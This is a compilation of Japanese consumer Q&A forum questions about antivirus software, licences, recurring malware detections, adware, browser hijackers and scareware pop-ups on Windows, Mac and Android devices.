Norton Internet Sequrity、バージョンは21.6.0.32です。 1週間ほど前（2/13）に、W32.Imaut.CNというウイルスを見つけたようで、レポートによると検疫済みで解決しており、とくに処理は必要ないとのことでした。 しかしそれから毎日、「脅威が見つかりました」とポップアップが出るようになり、その詳細レポートを見ると、上記2/13に処理されたウイルスのことを指しています。 すでに処理済みなので何もすることが無く、そのままレポートウインドウを閉じていますが、毎日出てきてなんだか気持ち悪いです。 ノートンの処理履歴には、過去に何度かウイルス処理の記録が残っていますが、今回のように何度も処理のポップアップが出るのは初めてです。 なにか処理操作をしないといけないのでしょうか？ お判りになる方がいらっしゃればアドバイスをよろしくお願いします。 OSはWindows8.1です。
Win7 を使用しています。マルウェアと言うのでしょうか?Salusというものに侵入され、もう何度も、アプリケーションから削除しています。以前もあり、IObit Uninstallerを導入し、暫くは大丈夫でした。ところが月日が経つのは恐ろしいもので、すっかり忘れており、おそらくIObit Uninstallerを削除したものと思うのですが、とたんにSalusが復活したのか?最近やたらに出てきます。再度、IObit Uninstallerを導入しようと思っているのですが、今度は何故かIObit Uninstallerがインストール出来ません。どう対処すれば良いのでしょうか?
s7159.exeの正体知っている方いますか？ Virus対策ソフトで複数回検知したのですが、調べると英文サイトで100件少々しか情報が無くどうやら無害らしいのですが。 temp配下に格納されている事が解明のカギになりえるのでしょうか？
自分のパソコンに接続しているコンピュータ数を知るには、Dos窓からnet sessionと打ち込めば 良いようなのですが、試してみると　「システムエラー5が発生しました。アクセスが拒否されま した」と出ます。これは異常なのでしょうか。　OSはWin7 pro 64Bitです。 ちなみに、単にnet と打ち込むと反応してコマンドの一覧が出ます。
BTOしたPCで、win8.1を使っています 設定などは買った時から全くいじっておりません ウイルスを疑いノートンインターネットセキュリティで 完全スキャンを試してみましたが、異常は見つからず・・・ フリーの対マルウェアソフトやノートンパワーイレイサーも 使ってみましたが結果は変わらず・・・・・ ちなみに再起動の周期はバラバラで、時間なども特に決まっていません 原因が分かる方いらっしゃったらどうかお助けください・・・
画像のような、CM広告のようなものが不定期に自動的に表示されて困っています。 表示される物自体は単なるCMのようなので害は在りませんが、これを自動的に表示させているソフトがウイルスのようです。 知り合いの子が泊まりに来て私のパソコンを夜通し遣って 「 ニコニコ動画 」　のような動画サイトを観て遊んでいるみたいなのですが、どうやらその関係からおかしなものを引っ張ってきてしまったらしいです。 その子は泊まりに来る度に必ず何かしらのパソコントラブルをもたらして帰っていきます。 今後遣わせないことには決めましたが、まずはパソコンをなんとかしたいです。 リカバリしか方法が無いとのことで、次の休みの日に時間をかけてリカバリを掛ける予定ですが、やっておきたいことがあります。 ● 残しておきたい動画や画像の保存 ● 残しておきたい 「 お気に入り 」 サイトの保存 公私を通して毎日のように使用するパソコンですから、デジカメや iPod Touch などで撮影した動画・写真をパソコンに移しており、残しておきたい動画や画像が数百から数千に亘って存在します。 また、検索やショッピングなどでよく利用するサイトや、検索する過程で見つけた有力情報が記述されたサイトをリンク先として 「 お気に入り 」 に残してありますが、これも毎日のように使用するパソコンですから何百サイトもあります。 一つ一つ記録するのはあまりにも大変なので、簡単にすべて保存できる方法を探しています。 以前はUSBメモリを買ってきてやっていましたが、USBメモリですと全てを記録してもリカバリ完了後に調べると幾つかの動画・写真、そして 「 お気に入り 」 として残しておいたリンク先サイトが無くなってしまいます。 なので、確実に全て残せる方法を知りたいです。
Windows7で、Bitdefender Total Security 2015 を使っています。 ウィルス判定されて隔離されたファイルはどこにあるのでしょうか？
マカフィインターネットセキュリティ2014　3年3台　CD版 という製品があります。 家のパソコン1台に使用して、残り2台使用できると思うのですが、 i phone 2台もしくはギャラクシータブレットへの使用は可能ですか？ できない場合、残りを有効に使う方法などはありますか？ i phoneとギャラクシータブレットのセキュリティソフトは使った方がいいですか？ もしオススメのソフトがあれば教えて下さい。 質問ばかりですみません。初心者ですので操作が簡単な方が嬉しいです。 よろしくお願いします。
パソコンに有料のセキュリティソフトを入れたいのですが、おすすめの物があれば教えてください。
昨年末にMacBookProを購入したのですが、ファイル共有でのダウンロードからか、Filmzhub???や、Mackeeperの広告ポップがやたらとでてきてとまりません。。。。 ネットの速度も遅くなったり、止まってしまったりなど 本当にこまっています。。。。 ちなみに、OS X10.9.5を使っています。 どなたか詳しい方よろしくお願いします＞＜
パソコンを立ち上げると、SystweakASP.tmpのアイコンがタスクバーに出てきます。 インストールした覚えは全くなく、いったい何のアプリなんでしょうか？ もしかしたらウィルスかと思い、アンチウィルスソフトで検索しても引っかかりません。 お分かりの方がいらっしゃれば、是非お教え頂きたいのですが。
エクセル2013で、最近データをダウンロードすることが多くなったのですが、なんか、おかしくなった気がするのです。私の技量ではよくわからないのですが、小さなハイパーリンクの粒が多く出てきます。削除しても削除してもまたあらわれてダメで、切り取ってまとめて他のシートに貼り付けてそのシートごと削除しています。そのたびにすればなんとかなってはいたのですが、今度　”このブックには、安全ではない可能性のある、外部ソースへのリンクが、1つ以上含まれています。リンクを信頼できる場合、リンクを更新して最新データをとりこみます。信頼できない場合は、データをそのまま手元で処理してかまいません。”と表示されましたが、意味が解らないので更新しませんでしたが、どーゆうことなのでしょうか。ダウンロードしている、と言っても数字だけをコピーしているだけです。ちなみにウインドウズは8.1です。外部ソースというのが気になります。誰か教えてください。お願いします。
googl Chromeの拡張機能にdoiwnlo AAditkeepというものが入ってきます。 削除しても立ち上げる毎に、入ってきて完全に削除する方法が解りません。 完全削除する方法を教えてください。
Wise Care 365 Pro版の試用期限が切れたので、　Free版をインストールしよう しましたが、何度試みてもPro版になってしまって使い物になりません。 Free版というものはWiseの戦略で本当に存在するものなのでしょうか。
老人ですＩＴは苦手です。ボケ防止の為にパソコンを始めましたが何が何だか用語からしてわかりませんが教えてほしいのでよろしかったらお願いします。ウィルスの被害と対策ですが人の意見を聞きたくツイターを読むのが楽しみなのですがここからもウィルスの感染はあるのですか？また２チャンネルには興味のひくところがいっぱいあるのですがここも危険なところなのですか？また２チャンネルの見方も被害を受けない程度の閲覧の仕方をお願いします。
何ヶ月経過しても解決できませんし、本当に困り果てております。 同じような悩みの方も多いと思います・・・ 色々自分なりに調べましたがどうにもなりません。 どなたか本当に教えてください・・・ こんなに悩んだことはないくらい悩んでおります・・・ 内容はこちらです↓ このページはセドの ドメインパーキングプログラムによってドメインオーナーに無料で提供されたものです。というページが最近Chromeのブラウザにタブで勝手に出ます。タブの出る数が3つ4つくらい出ます。 最近では朝起きると10個以上グーグルクロームにタブが勝手に出ております。 タブを消すのが本当に大変です。 それにリアルタイムに勝手にタブが自動的に出ますのでメールを作成していたりすると本当にうっとうしくて仕方ありません・・・ 邪魔で仕方がないですし、何故出るようになったのか分かりません。 このページを今後表示させないようにするにはどうしたらいいでしょうか？ どなたか助けてください・・・。
自宅のノートパソコンには大切なエクセルシートがあります。そのシートには郵便局や銀行の暗証番号が全部載っています。外部からエクセルシートを見られないように有料アンチウイルスソフトNOD32を入れています。しかし、無料アンチウイルスソフトAVG等でも性能にさほど差はないと聞きました。実際のところはどうなんでしょうか？
ウイルスを検出 あなたが前回訪問したウェブサイトが、あなたのデバイスを感染させました。 修復プロセスを開始するにはOKを押してください。と表示がでたのでその後OKをおして最終的にはMacキーパーに誘導させられました。 対処するにはどうすればよいですか？?
今までNTT西のフレッツ光だったので、NTTの無料のセキュリティソフト使ってたけど、フレッツ解約したのでavast入れたんですが、無料版なのでファイアーウォールがありません。 無料版のavastとWINDOWS標準のファイアーウォールだけでは、NTTのサービスで無料で付くセキュリティよりも安全性は劣りますか？ また、その場合、セキュリティとファイアーウォールがセットになったもので安い(できれば1000円以下)でおすすめのものはありますか？
ウイルス対策ソフトSymantec Endpoint ProtectionをiPadにインストールしたいのですが方法がわかりません。 どなたか手順をご存知の方いらっしゃいましたら教えてください。 よろしくお願いします。
youtubeの動画をダウンロードしようと「dipy」というサイトを使いました。 前までは簡単にｍｐ3に変換できていたはずなのですが、 昨日ひさしぶりにそのサイトを使ってダウンロードし終わると 隠しフォルダが隠れてない表示になっていたり、かなりおかしい広告がでてきたり ネットワークのアクセスポイントを変える？だとか警告表示されたり、 かなりまずいと思ってそのあとウィルススキャンをしたら 案の定トロイの木馬を検出しました。 なんとかウィルスは除去できたようなのですが、この状況を踏まえて質問します。 １、youtubeのダウンロードした動画にウィルスがはいっていた ２、「dipy」というサイトを利用した動画にはすべてトロイの木馬が仕組まれている 何が原因でウィルス感染したのでしょうか。 よろしくおねがいします。
ウイルスバスターの更新手続きについて教えて下さい 毎年3/31に期限が切れるので更新していますが 3/31の夜中0時を1秒でも過ぎて4/1に更新すれば 有効期限4/30までになるのでしょうか？ 数秒間はセキュリティソフト無しになってしまいますが 数秒なら大丈夫だと思うので もし1ヶ月もお得ならそういうやり方にしようと思います。 よろしくお願い致します。
知らないうちにMcAfeeがインストールされてしまいました。 コントロールパネルからアンインストールしたいのですが、削除ができません。 何か特別な方法があるのでしょうか。 使用しているOSは Windows 7 です。 よろしくお願いします。
シマンテックという会社が作っているノートンは、長い間、シェアNo１でしたよね？ こういったソフトは製造費などがほとんど掛からないため、売れていれば売れているほど圧倒的に優位になるのではないのでしょうか。 会社の利益が増えるのはもちろん、ユーザーから集められる新種のウィルス等の情報も大きなアドバンテージになると思うのです。 にも関わらず、なぜESET社にNo1の座を奪われてしまったのでしょうか。
ウイルス対策ソフトでフリーのものをよく使用しているのですが、システム脆弱性が発見されたり対策されたりするWindowsシステムでは、今（2015年）最も強力で軽くてフリーなものってどれなのでしょうか？ avast？AVG？その他？ 皆さんは、今何をお使いですか？ ウイルス対策ソフト入れているのにウイルス感染したことはありませんか？
未だに使ってます　危険なの？ 家庭用PCのセキュリティ問題でそういった事件きいたことないけど
昨日からパソコンのウイルスバスターからスパイウェア&ウイルスを削除しました。とお知らせが何度も出ています。原因がわかりません。なぜですか？
ネット中、ノートンが突然「脅威を検出しました」と表示され、脅威名は「softonic」感染ファイルは「softonicdownloader_for_lhaz.exe」でした。 でも、softonicとは、ウイルス名ではなく、softの会社ですよね？ これは、この会社の名前を語ったウイルス？と、混乱してます＞＜； ノートンのログは以下の通りです。 ファイル名: softonicdownloader_for_lhaz.exe 脅威名: Softonic 絶対パス: c:\users\user名\desktop\softonicdownloader_for_lhaz.exe ____________________________ 詳細 少数のユーザー,  定着、リスク 低 提供元 ダウンロード元  不明 活動 実行した処理: 実行した処理: 1 ____________________________ コンピュータの評価日  2014/04/11 10:16:34 最終使用日時  2015/01/28 16:00:49 起動項目  いいえ 起動済み  いいえ ____________________________ 少数のユーザー ノートン コミュニティの 数百人のユーザーがこのファイルを使いました。 定着 このファイルの更新日は 31 日以上 2 年 6 カ月 前です。 低 これは危険度が低いファイルです。 脅威の種類: セキュリティリスク。 セキュリティまたはプライバシーのリスクを伴いながらまだ悪質として分類されていないプログラム。 ____________________________ コピー元: 外部メディア ____________________________ ファイル処理 感染ファイル: c:\users\user名\desktop\ softonicdownloader_for_lhaz.exe 削除しました ____________________________ このあと、念のためノートンで完全スキャンをしてみたところ、この脅威は見つかりませんでした。 これはウイルスなのでしょうか？もし、ウイルスだとしたら、どんなウイルスなのでしょうか？ OSは、Windows7 64bit HOMEPremium SP1。ネットへはルーターでPCを1台繋いでいます。 もしお分かりになる方がいらっしゃったら教えて下さい。よろしくお願いします。
google earthのダウンロードのセキュリティーブロックを外したい。osはWindows7です。
アンチウイルスソフトとかファイアウォールとかスパイウェア対策ソフトとか… 色々ありますけど、全部同じじゃないんですか？ パソコンの知識がないあまり、パソコンのウイルス対策ソフトの違いがよくわからなくて困っています。 フリーソフトでなんていうウイルス対策ソフトを入れたらいいのでしょうか？ ウイルス、スパイウェア、ファイアウォール…などを全て含めて、入れたほうがいいオススメのウイルス対策ソフトを教えてください。 恐らく、一つじゃ無理だと思うので、組み合わせでも構いません。 今使っているソフトはAVGとALyacとかいうソフトです。 ALyacより、パソコンの元からのファイアウォール機能のほうがいいんですかね？ パソコンは富士通のwindows７　プレミアム　６４bitです。 ご回答よろしくお願い致します。
ESETCYBERSECURITY　Ver. 5.0115.0 Mac OS X 10.10.1 最近ソフトを更新した後からDropboxが開けなくなりました。 具体的には、 ・IDとPWを入力してもログインボタンが押せない（薄く表示） ・何とか強引に入っても、フォルダが一切表示されない ・ログアウトしようにもIDをところをクリックできず他の操作が全くできない 色々調べたら、Winでは 詳細設定→Webとメール→プロトコルフィルタリング→ のように進んで設定するみたいですが、 MACのせいなのか、Webとメールを開いたらその後のプロトコルフィルタリングがなくて次に進めず困っています。 どなたか知恵を拝借できませんでしょうか？ ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
Windows7環境で　Ｖｅｒ7.0.302.31を使用していますが つい最近2015年/1月の　WindowsUpdateから以降 Windowsを起動すると「新しいネットワークを検出した。」と表示され 使っているネットワークは「パブリックな環境？」「パーソナルな環境？」 などと聞いてくるようになりました。 これに答えると、 「ファイアウォール設定の読み込みに失敗しました」 が表示され、ブラウザのネット接続ができなくなります。 このとき診断すると『診断ポリシーサービスが実行されていません』と出て答えがありません。 この状況になると、何度かブラウザを再起動してやっと復旧するという感じです。 どなたか、解決方法をご教示願えないでしょうか？ ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
マカフィーで必要なファイルがウイルス扱いされて削除されてしまいます。 復元させても復元したそばからまた削除されていまいます。 リアルスキャンを解除すれば復元できますが、まさか解除しっぱなしというわけにもいきませんし。 このファイルをウイルス扱いから解除したいのですが、どうすればいいのかわかりません。 検索しても古いマカフィーの扱い方しかでてきません。どうすればいいのでしょうか？ ふつう削除するときファイルの扱いをどうするか質問してくるかと思いますが、マカフィーの場合問答無用で削除した報告だけでした。 OSはWIN8,1、マカフィーは買いたてのパソコンに入っていた30日無料版です。
先月ぐらいから、あらかじめインストールしてあるノートンアンチウィルスから 『trojan.semnagerを削除しました。』 とうメッセージが出ます。 削除したならいいのかな、と思ってると、 数日おきにパソコンを立ち上げるたびに同じメッセージが出ます。 しかも、トップページが勝手に『ask.com』とかいうのに変更され、元に戻しても戻してもまた変えられてしまいます。 多分、このまま放っておいたらマズイと思うのですが、どうしたらいいでしょうか。
パソコンからラジオのような音が鳴り出すので困っています しばらく操作せずにスタンバイ状態のときにたまになりだして マウスやキーボードに触れてスタンバイが解除されると音も止まります 多分中国語のような気がするのですがなんらかのアドウェアでしょうか どうしていいかわからず突然鳴り出す音に不気味で何とかしたいです
ワンクリックウェア駆除ツールでも消えないんです。 一旦消えたかと思えば又得意な画面が出てきます。 一体どおすればいいのでしょうか？
【前回の質問のページ→http://oshiete.goo.ne.jp/qa/8895427.html】 前回、回答してくださった方。本当にありがとうございます。 またまたすみません…… お先に、長文ですみません。文章も分かりにくいかと思います。 それでもどうか、お付き合いいただければ幸いです。 ----- 昔にもフリーソフトをダウンロードしてウイルスにかかって初期化したことがあり、気を付けていたのですが…。 あのフリーソフトはグーグルの翻訳を見ながら頑張っていたのですが、 こちらにもあるように（http://www.japan-secure.com/entry/blog-entry-475 …） 拒否の項目が見えにくくなっていて、そこでかかってしまったみたいです…。 回答してくださった方の こちら（http://detail.chiebukuro.yahoo.co.jp/qa/question …） をやってみました。 見事に復元は成功し、「コントロールパネル→プログラムのアンイストール」に出てくる一覧からomiga-plusはなくなりました。 のですが。 まだChromeを開くとomiga-plusが開いてしまいます。 回答をくださった方の 「・右上のの 3 つの水平方向の線アイコンをクリック。 　・設定 　・検索エンジンの管理 　・不要な検索エンジンをリストから削除 コレで消えない場合は 　・ブラウザのアイコンを右クリック 　・プロパティを選択 　・ショートカットタブを開く 　・リンク先のフィールドから、Isearch.omiga-plus.com、もしくはOmigaPlus.inspsearch.com 　　の部分を削除」 もやりましたが戻りませんでした。 他は ・http://www.japan-secure.com/entry/blog-entry-475 …　→　サイト内のURL先が削除されていて試すことができませんでした。 ・http://www.remove-pcvirus.com/jp/delete-omiga-pl …　と 　http://ameblo.jp/sacaiyoco/entry-11783654686.html　　　→　[起動時に最後のオプションを選択し、ページに設定] がどうしても分かりませんでした…すみません… ・http://uirusu.jp/isearch-omiga-plus-com/　→　Chromeのカスタマイズと操作…が場所とかが分かりませんでした… ・http://ameblo.jp/odayakadays/entry-11930363286.h …　→　私のわがままなのですが…。ツールをダウンロードしましたが、英語で大変ですし、フリーソフトでこんなことになっているのにフリーソフトをインストールする気にはなれませんでした…。 ----- こうして見ると、わからないことだらけで嫌になってしまうかもしれませんが… 怖くて本当に困っています。 omiga-plusが出てきても復元していてコントロールパネルになければパソコンに問題はないのでしたら、 別に出てきてしまっても私は大丈夫なのですが…（問題ないなんてことは無いでしょうけれど…） 分からないことばかりで、迷惑をおかけして、本当に申し訳ありません。 どうか直るまでお付き合いいただければ幸いです。 よろしくお願いいたします。
現在使用している「ノートン」から別のセキュリティソフ「ＥＳＥＴ」トへの乗り換えを検討しています。 ※使用ＰＣはＳＯＮＹのＶＡＩＯ　ＶＰＣＣＢ１９ＦＪ/Ｄ（Ｗｉｎ７）です。 (1)ＥＳＥＴ体験版をダウンロード (2)ノートンをアンインストールする (3)オフライン状態でＥＳＥＴ体験版をインストールし有効（アクティベーション化）にする。 ※不可能？ (4)オンライン状態でＥＳＥＴ体験版の動作を確認し、ＥＳＥＴ購入かノートンに戻すか検討する。 上記の流れで乗り換え作業をしようと思うのですが、 質問１：(3)のオフライン状態でアクティベーション化出来ない場合、オンライン状態で作業する必要が出てくるのですが、ＥＳＥＴ体験版を有効にした後、スキャンすればウィルス等のリスクは発見、隔離可能でしょうか？ ※セキュリティソフトが有効でない作業中に侵入する可能性のあるリスクを、体験版を有効後に発見・隔離は可能？ 質問２：ＥＳＥＴ体験版からノートンに戻す場合、過去にインストールした「プロダクトキー」が必要になるのでしょうか？ ※最初にインストールした２００９→２０１０→２年版→１年版と更新していますが、ディスクを処分している為、プロダクトキーが分かりません。 質問３：ＥＳＥＴ体験版を削除後、ノートン体験版を新規ダウンロード、使用する事は可能でしょうか？ ※ノートンに戻す場合は、ＥＳＥＴ体験版をアンインストール後にノートン体験版→製品版購入で問題ない？ 現在、使用のノートンの期限が１か月弱なので、使用するセキュリティソフトが決まったら、製品到着の間は体験版で対応使用と考えています。 不備、不足があれば補足いたします。
お尋ねします。 今日、ネットサーフィンをしていたところ、脅威に遭遇しました（あるHPを閲覧した際）。 使っているセキュリティーソフトはカスペルスキーです。 またカスペルスキーのレポートを見ると、HEUR:Trojan.Script.Iframerというトロイの木馬を駆除しています。 それでこの状況は、ウイルスに感染しているのでしょうか。 私はパソコンに疎く、よくわかりません。 わかる方がいらしましたら、私のパソコンの状況を教えてください。
無料のウイルス対策ソフトはたくさんあるのに わざわざ有料のソフトを買う人は、なぜですか？ 無料のウイルス対策ソフトではやはり完全にはウイルスは防げないのでしょうか？ それとも無料の物だと広告が邪魔だからですか？ 私はインターネットをちょろっと見るくらいしかPCは使わないのですが、 有料のソフトを買うべきか、無料ので十分なのかわかりません。 広告が出るのは、我慢できます。
11月の終わりにESETのファミリーセキュリティを購入しました。初め体験版からWindows8のノートパソコンで使用して期限が切れたので製品版として更新しました。そのノートパソコンでは問題なく使えているのですが、先日デスクトップにも入れようと思い、ホームページからWindows用をダウンロードしました。起動するとシリアル番号を入力するように言われ、確かに入力したのですが、不正なコードですと表示されて使うことができません。メールに記載してあるものをコピペしても駄目でした。デスクトップのWindowsパソコンに入れるにはどうしたらいいのでしょうか？5台使えるとのことですが、まだノートパソコンとAndroid端末の2つまでしか使用していません。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
パソコンのウイルス?の削除の方法がありましたら教えていただきたいです。 　実はある外国のサイトを見ているに間違ってクリックしたところ。画面に変な表示がされるようになりました。ディスクスキャンしてみると、感染のおそれがある箇所が相当数あり、危険な状況にあると判定されます。駆除するソフトを購入して、駆除できるのかわからないので、購入を迷っています。起動してすぐにあるURL(http//douga329.info/pc/reg2.php?cccid)が常時2画面開きます。中身は空なのですが、その画面が表示されないようにしたいのですが、方法がありましたら教えていただきたいです。そのせいかパソコンが不安定で異常に反応速度が遅いです。
こんにちは。 IEを使っているのですが、トップページが海外のに変更されてしまいました。 いやなので直そうとインターネットオプションや、IEのリセットもダメでした。 どなたかよい方法をご教授ください。 よろしくお願いします。
ウイルスバスターでアクセスしようとすると、画像の表示が出てアクセスすることすらできないサイトがあるのですが、こちらは本当に危ないのでしょうか？評価もタイプも未評価のため、具体的にどう危ないのかがわからず…迷っています。
MSからの連絡で当方のアカウント情報が書き換えられた模様です。MSに問い合わせてもこちらの知識が不十分なため、解決できません。どのような方法を使えばはっきりするものなのでしょうかご教示いただけませんか。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
インターネットのとあるサイトを閲覧していたら、以下のメッセージがでてきました。 Your phone has been exposed to a virus when browsing infected websites. Tap ＯＫ to download ＡＰＰ to scan your phone. いかがわしいサイトとか有害なサイトを見ていたわけではなかったので、なんだろうと思って文を読む前にOKをタップしてしまったかもしれません(その後あれこれやっているうちにもう一度でてきて、そのときはOKをタップせずそのままぶらうざを終了しました)。 それから、気のせいかもしれませんが、スマホの通信速度が遅くなっているような気がして、心配になってウイルスのコトを調べました。すると、またしても 「Worning! Your phone has 13 virus…」のようなメッセージが表示されておかしいぞとやっと気づきました。そのままぶらうざを終了しました。 それからウイルススキャナなどでチェックをしたのですが、検出されず、しかし速度が遅いままなのでもしやと思って憂鬱です。 専門家に見せた方がいいのでしょうか。 対策等はないのでしょうか。 教えてください。因みにAndroid Xperiaです。 はじめての質問なので、勝手がわかりませんがどうかよろしくお願いします。
Androidスマホ版のウイルス対策アプリ、 AVG PRO を使っています。 ウイルス定義の更新は、【アプリが通信することで】行われる。 もしくは【アプリをアップデートすることで】行われる。 どちらでしょうか？ アプリ起動後アプリが通信しようとするのですが、とりあえずファイヤーウォールで止めています。 通常のアプリなら、通信しなくても使えるものは通信遮断していても問題ありませんが、 ウイルス対策アプリの場合は、ウイルス定義の更新をアプリの通信によって行っているなら、通信遮断していては良くないですよね？ アプリをアップデートすることで行われるなら、このままでも良いと思いますが、その辺どうなんでしょう？
インターネットをしているときに、一瞬だけdos画面が立ち上がって消えます。一瞬なので画面は真っ黒で何が出ているか分かりません。 特に、支障は出ていないのですが、何かのウイルスに感染しているのか心配です。ウイするチェックをしても引っかからないので問題はないかと思ってそのままにしているのですが、何かご存知の方アドバイスをお願いします。OSは、win7　32bit、ブラウザはグーグルクロームを使用しています。
現在、自宅のPCにウイルスバスタークラウドをインストールしていますが、３月末が契約更新期限で、更新には３年版で13,000円ほどの費用が掛かります。 必要不可欠なものであることは分かっているのですが、今の自分には痛い出費です。 そこで、これを機にキングソフトのセキュリティソフトに乗り換えようと考えているのですが、どう思われますか？ 原則フリーソフトで広告を抜いても2,000円の費用で済むそうですし、他の有料セキュリティソフトにもひけを取らないらしいのですが、自分の周囲には利用者がおらず実態・評判などがよく分かりません。 実際に当該ソフトを導入されている方、または他にお薦めのセキュリティソフトがありましたらご教授ください。
大容量の写真データの処理、ソフトがスムースに動くＰＣの仕様を教えて下さい　ＯＳ、ＣＰＵマザーボード、グラフックボード、増設ＲＡＭ・・・・。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
たまに出るのですが、二度と出ないようにするにはどうしたら良いのでしょうか。
　 プログラムをアンインストールしようとすると、「現在のプログラムのアンインストールが完了するまでお待ちください。」と表示され、アンインストールができません。 何らかのウィルスに感染しているのでしょうか。　 補足： これとの関連があるか定かでありませんが、WORDのファイル保存時／終了時の動作に異常が現れるようになりました。 　 　
タスクマネージャー→プロセス→Eset service (32ビット)を一時的に消したいのですが、タスクの終了をクリックしてもゾンビのようにすぐに復活してしまいます。 スタートアップのEset Main GUIを無効にしているのに、再起動してもEset service (32ビット)はなぜかメモリを占領しています。 タスクマネージャー→サービスからekrnの「停止」をクリックしても、「要求された制御はこのサービスに対して無効です」と表示されてしまいます。 どうすれば消せますか。 後に復活させたいので、完全消去をすることはできません。 OSはWindows8.1です。
PCを起動したらa80ec31e-e386-4e2c-b330-eb51450623dd.dmp.zipというような名前のファイルが消しても消してもデスクトップに出てくるんですが、何かのウイルスでしょうか？ windows7 64bit です。 ウイルス対策ソフトはavastの無料版です。
デモ実感でもできませんか？ 皆さん疑心暗鬼、付和雷同になっているだけのように見えます 常識を疑えと言いたいです もし私がメーカーの人間ならば皆さんと同じように絶対に買い換えるべきだと煽るでしょうけどね。 またLinuxなら比較的安全とか言いますがlinuxのほうがxpよりウイルスソフトも含めて洗練されていないわけでlinuxの方が危ない気がします puppyを入れてみましたが削除「初期化」できなくなりました。
方法を教えてください。行ったことは、 1.インターネットオプションで、末尾のdelta-homesを削除してもダメ。 2.ブラウザは今は、IE11のみにしています。 3.サイトで、以下の方法も試してみましたがダメ。 http://detail.chiebukuro.yahoo.co.jp/qa/question … 私のPC内には、「delta」というファイルは有りませんが、今は使っていないファイルを、 きれいさっぱり削除しましたが、居座っています。 クレジットカードの情報などが不安です。
　皆さんメーカーに載せられすぎていませんか？ http://blog.livedoor.jp/blackwingcat/archives/18 … http://ameblo.jp/miroku-plus/entry-11596860771.h … http://www.lifewithunix.jp/notes/2014/04/10/dont …
Windows7で、コントロールパネルのプログラムのアンインストールを見たら、”App Lid”が残っていたので、アンインストールしようとしたのですが、できません。 たぶん、”Ads by App Lid”の事かな？と思うのですが、これは、何ですか？アンインストールしておく必要がありますか？その場合、方法を教えて下さい。
ウォークマンSシリーズはウイルスに感染しますか？ 先日友達に私のウォークマンに曲を入れてもらい、その後パソコンで充電して暫くしたらお兄ちゃんに「ウイルス入ってんだけど」と怒られました。 私の普段みてるサイトはYouTubeで、最近誤ってクリックした覚えもないので原因がなんなのかわかりません。 唯一可能性があるとしたら、ウォークマンかなぁ……と思って投稿してみました。 回答お願いします。
１年版～５年版とかありますが月単位で利用したいのですがどのセキュリティーソフトが良いか迷ってます。 ウィルスバスター、ノートン、マカフィー、カスペルスキー（体験版で不具合有り、製品版ではどうか？）。 おすすめ教えてください。
英文hpにしか飛びません 更新しないとそんなにまずいですか？
初心者で申し訳ありません。 この度PCを買い替えました。 今のPCは、ノートンを自動更新をしたばかりなのと、 IDセーフをそのまま使用したいので、ノートンを使用するつもりでいます。 ただ、新しく購入したPCにはすでに、マカフィー　リセーフの12カ月更新が付いています。 ウィルスソフトを同じPCで複数インストールするのは、良くないとの事なのですが、 どの段階で新しいPCのマカフィーをアンインストールすればよいのでしょうか？ マカフィーの設定等を何もする前でも、ノートンを新しいPCで インストールしない方がよいということですか？ ノートンの契約しているプロダクトキー（複数）を他のPCで使用しているため 旧PCでの、ノートンのアンインストールをしてからの新しいPCでの設定 IDセーフをローカルのまま使用しているので、できればローカルのまま 移せないかを初心者のくせにしようとしているので、ウイルスソフトが 新しいPC上にない期間ができてしまったら怖いという思いがあって、質問させていただきました。 よろしくお願いします。
　 メール経由のウィルスは受信するだけでは感染しませんよね。 メール経由のウィルスは受信したあと開くと直ぐに感染するのでしょうか。 それともそのメイルのコンテンツに誘導されて、様々なアクションを行った結果感染するのでしょうか。 　
　 結局コンピュータ・ウィルスって何を求めてPCの中に入ってくるのでしょうか。 やっぱ個人情報ですか（住所、氏名、電話番号、会社名、クレジットカード番号、銀行口座番号、・・・） 　 あるいは勧誘誘導（不正サイト、ワンクリック）でしょうか。 　
　 教えてください。　 セキュリティ的に危険なページ、危険なクリックボタンなどを見分けるコツはありますか。 　
56歳　ＰＣ音痴の男です。 先日、アダルトサイトをいじっていたら、「会員登録されました」になって、 それからパソコンを立ち上げるたびに、請求画面が現れるようになり困ってます。 どうしたら、これを解消できるでしょうか。 初心者にも解る操作方法があったら教えてください。 まぬけな話で恥ずかしいですが。 定年間近のしょうもないおやじの質問だと思って、よろしくお願い致します。
新しくiMacを購入し「ノートンセキュリティwithバックアップ」をインストールしました。 ノートンでパスワード管理ができると聞いていますが、「ノートンIDセーフ」というのが、それなんでしょうか？ パスワードを書いたメモがあちこちにあって、早く一つにまとめたいのですが、ノートンのどこから入って、どこに入力画面があるのか、全く分かりません。 ネットで調べても、いまいちよく分からなくて困っています。 以下のようなページもありましたが、まずここで一番最初に出てくるアイコンすら、どこにあるのか分かりません。（Norton Identity Safeのアイコン） http://outlook.aptrust.net/norton-id-safe/norton … ちなみに、iPadも購入して、同じノートンを入れましたので、そちらからも見ることが出来るようにしたいと考えています。 iMacからの入力方法を知りたいので教えて頂けますでしょうか。宜しくお願いいたします。
Eset Family Security 5ライセンス版を使用中です。 最近、広告欄に「お使いのPCが感染しています。早急にXXXをインストールしてください」というメッセ―ジが点滅します。いわゆるアドウエアだと思うのですが、ESETでは対応できないのでしょうか。フリーソフトでアドウエア対応するものも数多く見ますが、これらをインストールすることで感染する被害も出ているようなので、なるべく使いたくありません。最終的にはOSリカバリーか再インストールを覚悟しているのですが、ESETで効果的な対策ができるようであれば、ご教示ください。 ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
あと2日でパソコンのウィルス対策ソフトの有効期限が切れます。 更新するのにたった3000円なのですが、情けないことに残金が厳しく払うか迷っています。 お給料が入るまで更新しないで、そのままにしておこうかとも思うのですが、すぐに何かトラブルがありますか？ なんとも言えないでしょうか。
